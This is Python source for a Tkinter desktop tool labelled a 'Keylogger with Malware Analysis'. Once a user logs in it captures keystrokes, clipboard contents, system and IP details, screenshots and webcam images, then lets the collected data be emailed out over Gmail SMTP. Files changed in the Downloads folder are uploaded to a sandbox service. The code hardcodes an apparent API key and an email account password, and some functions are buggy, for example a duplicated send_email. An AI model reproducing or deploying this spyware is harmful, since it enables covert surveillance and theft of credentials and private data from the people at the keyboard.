import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext
import random
import sqlite3
import requests
from PIL import Image, ImageTk
from pynput.keyboard import Key, Listener
from threading import Thread
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import socket
import platform
from requests import get
import win32clipboard
import time
import pyautogui
from tkinter import Label, Frame
import cv2
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from scipy.io.wavfile import write
import sounddevice as sd
import json

# Hybrid Analysis API settings
api_key = "co55mqdg975215c0vj8ux9gd0db48bdd46q23qal314b101ba2yovoiwb22f7e95"  # Replace with your Hybrid Analysis API key
api_url = "https://www.hybrid-analysis.com/api/v2"


# File where captured keylogs will be stored
keylog_file = "key_log.txt"
comp_info_file = "comp_info.txt"
clipboard_information = "clipboard.txt"

screenshot_dir = "C:\\Users\\03080\\PycharmProjects\\interface\\project\\screenshots"

email_address = "eeml5084@gmail.com"
password = "vfnwzbhkcwkrysnr"
user_email = ""
captured_logs = []  # List to store captured keylogs in memory
clipboard_data = []
submitted_files = {}

text_area = None
screen = None

# Directory to monitor
directory_to_monitor = "C:\\Users\\03080\\Downloads"  # Change this to the directory you want to monitor

# Function to send the file to Hybrid Analysis sandbox
def send_file_to_sandbox(file_path):
    global api_key

    if not os.path.exists(file_path):
        print(f"File {file_path} does not exist.")
        return

    files = {'file': open(file_path, 'rb')}
    environment_id = "120"  # Windows 10 (64-bit)

    headers = {
        'User-Agent': 'Falcon Sandbox',
        'api-key': api_key.strip()
    }

    data = {
        'environment_id': environment_id  # Required field for the analysis environment
    }

    try:
        # Submit the file for analysis
        response = requests.post(api_url + '/submit/file', files=files, headers=headers, data=data)

        if response.status_code in [200, 201]:
            submission_data = response.json()
            analysis_id = submission_data.get('submission_id')
            print(f"File {file_path} successfully submitted. Analysis ID: {analysis_id}")
            submitted_files[file_path] = analysis_id  # Store the file and its analysis ID
        else:
            print(f"Failed to submit {file_path}. Response code: {response.status_code}")
            print(f"Response text: {response.text}")

    except Exception as e:
        print(f"Error submitting file: {str(e)}")

# File access monitoring handler
class FileAccessHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if not event.is_directory:
            print(f"Modified file detected: {event.src_path}")
            self.check_file_with_hybrid_analysis(event.src_path)

    def check_file_with_hybrid_analysis(self, file_path):
        threading.Thread(target=send_file_to_sandbox, args=(file_path,)).start()

# Function to start file system monitoring
def monitor_filesystem(directory_to_monitor):
    event_handler = FileAccessHandler()
    observer = Observer()
    observer.schedule(event_handler, path=directory_to_monitor, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# Function to start monitoring in a separate thread
def start_file_monitoring():
    monitor_thread = threading.Thread(target=monitor_filesystem, args=(directory_to_monitor,))
    monitor_thread.daemon = True  # Daemonize the thread
    monitor_thread.start()

# Function to update the malware analysis window with file details (path and analysis ID)
def update_malware_analysis():
    global text_area

    # Clear the text area
    text_area.delete(1.0, tk.END)

    # Iterate over submitted files and display their details
    for file_path, analysis_id in submitted_files.items():
        result_str = f"Modified file detected: {file_path}\n" \
                     f"File {file_path} successfully submitted. Analysis ID: {analysis_id}\n\n"
        text_area.insert(tk.END, result_str)

    # Schedule the next update after 2 seconds
    screen.after(2000, update_malware_analysis)

# Database setup
def create_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    # Create users table with an ID column
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            email TEXT NOT NULL,
            username TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()


# Function to send keylog txt file via email
def send_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Keylogs"
        body = "Please find the captured keylogs attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach the keylog file
        with open(log_file, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(log_file)}")
            msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with keylogs sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")


# Function to write captured logs to a file
def write_logs_to_file(logs):
    with open(keylog_file, 'a') as file:  # Open the file in append mode
        file.write(''.join(logs))  # Write logs without adding a new line


# Function to start capturing keylogs and store them in memory
def start_keylog_capture():
    def on_press(key):
        try:
            key_str = str(key.char)
            captured_logs.append(key_str)  # Store key in memory
            write_logs_to_file([key_str])  # Write the key to the log file
        except AttributeError:
            if key == Key.space:
                captured_logs.append(' ')  # Store space key
                write_logs_to_file([' '])  # Write space to the log file
            else:
                key_str = f' [{str(key)}] '
                captured_logs.append(key_str)  # Store other keys
                write_logs_to_file([key_str])  # Write the key to the log file

    def on_release(key):
        if key == Key.esc:
            return False  # Stop the listener

    # Start the keylogger in a separate thread to capture in the background
    keylog_thread = threading.Thread(target=lambda: Listener(on_press=on_press, on_release=on_release).run())
    keylog_thread.daemon = True
    keylog_thread.start()

# Function to capture computer information
def computer_information():
    with open(comp_info_file, "w") as f:  # Open in write mode to overwrite each session
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Function to capture clipboard data
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        # Only add to clipboard_data if it's new
        if pasted_data not in clipboard_data:
            clipboard_data.append(pasted_data)
            with open(clipboard_information, "a") as f:
                f.write("Clipboard Data: \n" + pasted_data + "\n")
    except Exception as e:
        with open(clipboard_information, "a") as f:
            f.write("Clipboard could not be copied\n")

# Function to start monitoring clipboard data
def start_clipboard_capture():
    def monitor_clipboard():
        while True:
            copy_clipboard()
            time.sleep(2)  # Check clipboard every 2 seconds

    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

# Global variable to store session directory
session_dir = "C:\\Users\\03080\\PycharmProjects\\interface\\project\\sss"
def capture_screenshot():
    global session_dir
    # Ensure session_dir is set; create it if not
    if not session_dir:
        session_dir = os.path.join(screenshot_dir, time.strftime("%Y%m%d_%H%M%S"))
        os.makedirs(session_dir, exist_ok=True)  # Create the directory if it doesn't exist

    screenshot = pyautogui.screenshot()  # Take a screenshot
    timestamp = time.strftime("%H%M%S")  # Create a timestamp for the screenshot
    screenshot_path = os.path.join(session_dir, f"screenshot_{timestamp}.png")  # Save with a unique name
    screenshot.save(screenshot_path)  # Save the screenshot

# Function to start capturing screenshots
def start_screenshot_capture():
    def continuously_capture():
        while True:
            capture_screenshot()  # Capture screenshot
            time.sleep(30)  # Wait for 30 seconds before the next capture

    screenshot_thread = threading.Thread(target=continuously_capture)
    screenshot_thread.daemon = True
    screenshot_thread.start()

webcam_session_dir = "C:\\Users\\03080\\PycharmProjects\\interface\\project\\webcam"

def capture_webcam():
    global webcam_session_dir
    if not webcam_session_dir:
        webcam_session_dir = os.path.join(screenshot_dir, time.strftime("%Y%m%d_%H%M%S_webcam"))
        os.makedirs(webcam_session_dir, exist_ok=True)

    cap = cv2.VideoCapture(0)  # Open the default camera
    while True:
        ret, frame = cap.read()  # Capture frame
        if ret:
            timestamp = time.strftime("%H%M%S")  # Create a timestamp for the webcam image
            webcam_image_path = os.path.join(webcam_session_dir, f"webcam_{timestamp}.png")
            cv2.imwrite(webcam_image_path, frame)  # Save the captured frame
        time.sleep(30)  # Wait for 30 seconds before the next capture

    cap.release() # Release the camera when done

def start_webcam_capture():
    webcam_thread = threading.Thread(target=capture_webcam)
    webcam_thread.daemon = True
    webcam_thread.start()

# Function to register a user
def register_user(email, username, password):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    unique_id = random.randint(1000, 9999)  # Generate a random ID
    # Insert user with the generated ID
    c.execute('INSERT INTO users (id, email, username, password) VALUES (?, ?, ?, ?)',
              (unique_id, email, username, password))
    conn.commit()
    conn.close()
    return unique_id


# Function to login a user
def login_user(username, password, user_id):
    global user_email  # Use the global variable to store email
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE username=? AND password=? AND id=?',
              (username, password, user_id))
    user = c.fetchone()
    if user:  # If user found, store email
        user_email = user[1]  # Email is the second column
    conn.close()
    return user


# Function to show the registration interface
def show_registration_interface():
    registration_window = tk.Toplevel()
    registration_window.title("Register")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\logo.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(registration_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(registration_window, text="Email").pack()
    email_entry = tk.Entry(registration_window)
    email_entry.pack()

    tk.Label(registration_window, text="Username").pack()
    username_entry = tk.Entry(registration_window)
    username_entry.pack()

    tk.Label(registration_window, text="Password").pack()
    password_entry = tk.Entry(registration_window, show="*")
    password_entry.pack()

    def register():
        email = email_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        if email and username and password:
            user_id = register_user(email, username, password)
            messagebox.showinfo("Success", f"Registration successful! Your ID is {user_id}.")
            registration_window.destroy()
        else:
            messagebox.showerror("Error", "Please fill in all fields.")

    register_button = tk.Button(registration_window, text="Register", command=register)
    register_button.pack()


# Function to show the login interface
def show_login_interface():
    login_window = tk.Tk()
    login_window.title("Login")

    # Logo
    logo = Image.open("C:\\Users\\03080\\Desktop\\logo.png")
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)
    logo_image = ImageTk.PhotoImage(logo)
    logo_label = tk.Label(login_window, image=logo_image)
    logo_label.image = logo_image
    logo_label.pack()

    tk.Label(login_window, text="TKMAS").pack()

    tk.Label(login_window, text="User ID").pack()
    id_entry = tk.Entry(login_window)
    id_entry.pack()

    tk.Label(login_window, text="Username").pack()
    username_entry = tk.Entry(login_window)
    username_entry.pack()

    tk.Label(login_window, text="Password").pack()
    password_entry = tk.Entry(login_window, show="*")
    password_entry.pack()

    def login():
        user_id = id_entry.get()
        username = username_entry.get()
        password = password_entry.get()
        user = login_user(username, password, user_id)
        if user:
            messagebox.showinfo("Success", "Login successful!")
            login_window.destroy()
            start_keylog_capture()  # Start capturing keylogs after login
            computer_information()
            start_clipboard_capture()
            start_screenshot_capture()
            start_webcam_capture()
            start_file_monitoring()
            main_screen()  # Proceed to main screen after login
        else:
            messagebox.showerror("Error", "Invalid ID, username, or password.")

    login_button = tk.Button(login_window, text="Login", command=login)
    login_button.pack()

    register_button = tk.Button(login_window, text="Register", command=show_registration_interface)
    register_button.pack()

    login_window.mainloop()

# Function to display captured computer information in a new window
def show_computer_info_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Text area to display captured computer information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the computer info from the file
    with open(comp_info_file, "r") as f:
        computer_info = f.read()
        text_area.insert(tk.END, computer_info)

    # Send Email button
    send_email_button = tk.Button(screen, text="Send Computer Info via Email", command=lambda: send_email(comp_info_file))
    send_email_button.pack(pady=10)

# Updated function to show clipboard information window and refresh live
def show_clipboard_info_window():
    global text_area
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")  # Use the global logo image
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Text area to display captured clipboard information
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Function to update the text area with captured clipboard data
    def update_clipboard():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, '\n'.join(clipboard_data))  # Display all captured clipboard data

    # Update clipboard info every 1000 milliseconds (1 second)
    def continuous_update_clipboard():
        update_clipboard()
        screen.after(1000, continuous_update_clipboard)  # Schedule next update

    continuous_update_clipboard()  # Start the continuous update

    # Send Email button to send clipboard info via email
    send_email_button = tk.Button(screen, text="Send Clipboard Info via Email", command=lambda: send_email(clipboard_information))
    send_email_button.pack(pady=10)

def show_screenshot_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Create a text area to display captured screenshots
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the screenshots from the current session
    if os.path.exists(session_dir):
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                text_area.insert(tk.END, f"{screenshot_file}\n")

    # Send Email button to send screenshots via email
    send_email_button = tk.Button(screen, text="Send Screenshots via Email", command=lambda: send_ss_email(session_dir))
    send_email_button.pack(pady=10)

def send_ss_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Screenshots from Current Session"
        body = "Please find the captured screenshots from the current session attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach all screenshot files in the session directory
        for screenshot_file in os.listdir(session_dir):
            if screenshot_file.endswith('.png'):
                file_path = os.path.join(session_dir, screenshot_file)
                with open(file_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename= {screenshot_file}")
                    msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with screenshots sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")

def show_webcam_window():
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Create a text area to display captured webcam images
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Load and display the webcam images from the current session
    if os.path.exists(webcam_session_dir):
        for webcam_file in os.listdir(webcam_session_dir):
            if webcam_file.endswith('.png'):
                text_area.insert(tk.END, f"{webcam_file}\n")

    # Send Email button to send webcam images via email
    send_email_button = tk.Button(screen, text="Send Webcam Images via Email", command=lambda: send_email(webcam_session_dir))
    send_email_button.pack(side=tk.BOTTOM, anchor='se', padx=10, pady=10)  # Bottom right corner
# Main Application Window with Menus and Logo

def send_email(log_file):
    global user_email
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = user_email
        msg['Subject'] = "Captured Screenshots and Webcam Images from Current Session"
        body = "Please find the captured screenshots and webcam images from the current session attached."
        msg.attach(MIMEText(body, 'plain'))

        # Check if the session directory exists and is not empty
        if not os.path.exists(session_dir) or not os.listdir(session_dir):
            messagebox.showerror("Error", "No images found in the session directory.")
            return

        # Attach all screenshot and webcam files in the session directory
        for image_file in os.listdir(session_dir):
            if image_file.endswith('.png'):
                file_path = os.path.join(session_dir, image_file)
                with open(file_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f"attachment; filename={image_file}")
                    msg.attach(part)

        # Sending the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, user_email, text)
        server.quit()

        messagebox.showinfo("Success", "Email with screenshots and webcam images sent successfully!")

    except Exception as e:
        messagebox.showerror("Error", f"Failed to send email: {str(e)}")

def main_screen():
    global text_area, screen, logo_img  # Use the global variables
    screen = tk.Tk()
    screen.geometry("800x600")
    screen.title("Keylogger with Malware Analysis")

    # Load logo image
    logo = Image.open("C:\\Users\\03080\\Desktop\\logo.png")  # Replace with your logo image path
    logo = logo.resize((50, 50), Image.Resampling.LANCZOS)  # Resample the image
    logo_img = ImageTk.PhotoImage(logo)

    # Create a top frame to hold the logo and the menu buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo at the top left in a frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Welcome interface
    welcome_frame = tk.Frame(screen)
    welcome_frame.pack(expand=True)

    welcome_label = tk.Label(welcome_frame, text="Welcome to the Keylogger with Malware Analysis!", font=("Arial", 16))
    welcome_label.pack(pady=20)


    screen.mainloop()

# Function to show the capture interface
def show_capture_interface():
    global text_area  # Ensure this is global so we can reference it in other functions
    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Recreate the top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add "Capture Computer Information" to the menu
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipbaord info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Create the text area for displaying captured logs
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, width=50, height=20)
    text_area.pack(padx=10, pady=10)

    # Function to update the text area with captured logs
    def update_logs():
        text_area.delete(1.0, tk.END)  # Clear the text area
        text_area.insert(tk.END, ''.join(captured_logs))  # Display all captured logs

    # Update logs every 1000 milliseconds (1 second)
    def continuous_update():
        update_logs()
        screen.after(1000, continuous_update)  # Schedule next update

    continuous_update()  # Start the continuous update
    # Send email button at bottom right
    send_email_button = tk.Button(screen, text="Send Email", command=lambda: send_email(keylog_file))
    send_email_button.pack(side=tk.BOTTOM, anchor="e", padx=10, pady=10)

def show_malware_analysis_window():
    global text_area

    # Clear the welcome interface
    for widget in screen.winfo_children():
        widget.destroy()

    # Create a top frame for the logo and buttons
    top_frame = tk.Frame(screen, bg="lightgray")
    top_frame.pack(side=tk.TOP, fill=tk.X)

    # Add the logo again to the new frame
    logo_label = tk.Label(top_frame, image=logo_img, bg="lightgray")
    logo_label.pack(side=tk.LEFT, padx=10, pady=10)

    # Create a top menu
    menu = tk.Menu(screen)
    screen.config(menu=menu)

    # Add menu items for other functionalities
    capture_keylog_menu = tk.Menu(menu)
    capture_compt_info_menu = tk.Menu(menu)
    capture_clipboard_menu = tk.Menu(menu)
    screenshot_menu = tk.Menu(menu)
    webcam_menu = tk.Menu(menu)
    malware_analysis_menu = tk.Menu(menu)

    menu.add_cascade(label="Capture Keylogs", menu=capture_keylog_menu)
    capture_keylog_menu.add_command(label="View Captured keylogs", command=show_capture_interface)

    menu.add_cascade(label="Capture Computer Information", menu=capture_compt_info_menu)
    capture_compt_info_menu.add_command(label="View Captured Info", command=show_computer_info_window)

    menu.add_cascade(label="Capture Clipboard info", menu=capture_clipboard_menu)
    capture_clipboard_menu.add_command(label="View Captured Clipboard info", command=show_clipboard_info_window)

    menu.add_cascade(label="Capture Screenshots", menu=screenshot_menu)
    screenshot_menu.add_command(label="View Captured Screenshots", command=show_screenshot_window)

    menu.add_cascade(label="Capture Webcam", menu=webcam_menu)
    webcam_menu.add_command(label="View Captured Webcam", command=show_webcam_window)

    menu.add_cascade(label="Malware Analysis", menu=malware_analysis_menu)
    malware_analysis_menu.add_command(label="View Malware Analysis", command=show_malware_analysis_window)

    # Create a text area to display submitted files
    text_area = scrolledtext.ScrolledText(screen, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH, padx=10, pady=10)

    # Start the periodic update for malware analysis
    update_malware_analysis()

if __name__ == "__main__":
    create_db()  # Set up the database when the program starts
    show_login_interface()  # Start with the login interface

